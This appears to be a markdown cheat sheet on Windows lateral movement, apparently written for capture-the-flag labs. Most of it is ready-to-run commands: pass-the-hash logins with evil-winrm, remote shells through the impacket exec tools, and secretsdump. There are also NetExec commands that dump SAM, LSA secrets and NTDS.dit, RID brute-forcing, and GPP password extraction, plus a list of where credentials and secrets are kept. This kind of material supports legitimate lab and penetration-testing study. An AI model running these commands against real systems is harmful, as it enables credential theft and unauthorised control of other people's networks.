# Windows Lateral Movement & Execution

Priority order when you have valid credentials (fastest/most reliable first):

1. **WinRM / Evil-WinRM** (5985/5986): full PowerShell, uploads, script loading.
   Check with `nxc winrm <T> -u <U> -p '<P>'` (look for `Pwn3d!`).
```bash
evil-winrm -i <IP> -u <USER> -p '<PASS>'
evil-winrm -i <IP> -u <USER> -H <NTLM>            # pass-the-hash
evil-winrm -i <IP> -u <USER> -p '<PASS>' -s /path/ # load PS scripts dir
evil-winrm -i <IP> -u <USER> -p '<PASS>' -e /path/ # load executables dir
evil-winrm -i <IP> -u <USER> -p '<PASS>' -S        # SSL (port 5986)
```
   Built-ins: `upload <local> [remote]`, `download <remote> [local]`,
   `Invoke-Binary <exe>` (runs C# in memory), `Bypass-4MSI`.

2. **Impacket exec tools** (SMB-based):
```bash
impacket-psexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'   # SYSTEM shell
impacket-wmiexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'  # stealthier
impacket-smbexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'  # when psexec blocked
impacket-atexec '<DOMAIN>/<USER>:<PASS>@<TARGET>' 'command'  # scheduled task
impacket-dcomexec '<DOMAIN>/<USER>:<PASS>@<TARGET>'  # DCOM-based
# With hash:
impacket-psexec -hashes :<NTLM> '<DOMAIN>/<USER>@<TARGET>'
# With Kerberos:
KRB5CCNAME=user.ccache impacket-psexec -k -no-pass <target>.<dom>
```

3. **secretsdump without a shell**: DCSync rights or local admin -> dump SAM.
```bash
impacket-secretsdump '<DOMAIN>/<USER>:<PASS>@<TARGET>'
impacket-secretsdump -hashes :<NTLM> '<DOMAIN>/<USER>@<TARGET>'
```

4. **NetExec validation + quick enum/exec**:
```bash
nxc smb <T> -u <U> -p '<P>'                         # Pwn3d! = local admin
nxc smb <T> -u <U> -p '<P>' --shares                # list shares
nxc smb <T> -u <U> -p '<P>' --users                  # domain users
nxc smb <T> -u <U> -p '<P>' --rid-brute              # RID brute-force
nxc smb <T> -u <U> -p '<P>' -x 'whoami'              # cmd exec
nxc smb <T> -u <U> -p '<P>' -X 'Get-Process'         # PS exec
nxc smb <T> -u <U> -p '<P>' --sam                     # dump SAM
nxc smb <T> -u <U> -p '<P>' --lsa                     # dump LSA secrets
nxc smb <T> -u <U> -p '<P>' --ntds                    # dump NTDS.dit
nxc smb <T> -u <U> -p '<P>' -M spider_plus            # crawl shares
nxc smb <T> -u <U> -p '<P>' -M gpp_password           # GPP creds
```

5. **SMB direct file grab**: if you know the flag path, just `get` it.
```bash
smbclient '//<TARGET>/C$' -U '<DOMAIN>/<USER>%<PASS>'
# > get Users\Administrator\Desktop\root.txt
```

## Execution-failure triage
- `rpc_s_access_denied` from psexec/wmiexec/smbexec -> you lack local admin /
  SVCCTL / DCOM rights. Don't spray; find the intended primitive.
- `STATUS_ACCESS_DENIED` on `C$` but shares work -> admin share rights
  separate from share rights; check token groups.
- Semi-interactive shells garble output -> prefer `nxc -x` or evil-winrm.

## Flag/secret locations
`C:\Users\<user>\Desktop\user.txt|root.txt`, `C:\Users\Public\`,
`C:\Windows\System32\config\`, `C:\PerfLogs\`, `C:\Shares\`,
`C:\inetpub\wwwroot\web.config`, `Unattend.xml`, GPP `Groups.xml`,
browser stores, DPAPI master keys, scheduled task configs.
